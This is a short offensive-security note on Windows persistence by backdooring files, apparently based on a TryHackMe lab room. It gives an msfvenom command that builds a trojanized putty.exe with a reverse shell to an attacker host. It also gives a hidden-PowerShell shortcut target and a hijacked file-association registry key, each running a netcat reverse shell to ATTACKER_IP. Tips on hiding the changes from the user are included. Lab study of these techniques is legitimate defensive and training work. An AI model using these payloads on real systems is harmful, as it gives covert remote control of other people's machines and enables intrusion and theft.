# Windows Persistence - Backdooring Files

## Injecting Executables Files

Look for shortcuts and executables that potentially used frequently; changing the properties of the file the user interacts by downloading and configure to execute an additional payload silently by adding an extra thread in the binary. Check to if would work on user's end also.

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=$ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

This is not that sneaky, but effective.

## Shortcut File Target Injection

Of Shortcut's properties change the "Target:" to `powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1` with `backdoor.ps1` be:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
# Path to original execuable below to create illusion th same process will run when shortcut is used
C:\Windows\Systenm32...
```

Make sure to "Change Icon..."  to revert any visble changes to the Icon display ni the GUI after editing this Shortcut.

## Hijacking File Associations

Default operation system file associations are stored as key in [Registry](Windows-Registry). For each file type a key is store under `HKLM\Software\Classes\` . For `.txt` stored `HKLM\Software\Classes\.txt`  subkey would look like the table below:

Name | Type | Data
--- | --- | ---
(Default) | REG_SZ | txtfile
Content Type | REG_SZ | text/plain
Percieved Type | REG_SZ | text

The Programmatic ID (ProgID) is is identifier to a program installed on the system; the `txtfile` of the above table is the ProgID. Most ProgID entries will have a subkey under `shell\open\command` hwre default command to run for file with that extension are specifed: `HKLM\Software\Classes\txtfile\shell\open\command`. This subkey will be `(Default) | REG_EXP... | %SystemRoot%\system32\NOTEPAD.EXE %1`. To backdoor this create a script:
```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
# The $DEFAULT = %SystemRoot%\system32\THISEXEHERE.EXE %1 of HKLM\Software\Classes\{File Type Targeted}\shell\open\command
C:\Windows\Systenm32\$DEFAULT.exe $args[0]
```

## References

[THM Windows Persistence Room](https://tryhackme.com/room/windowslocalpersistence)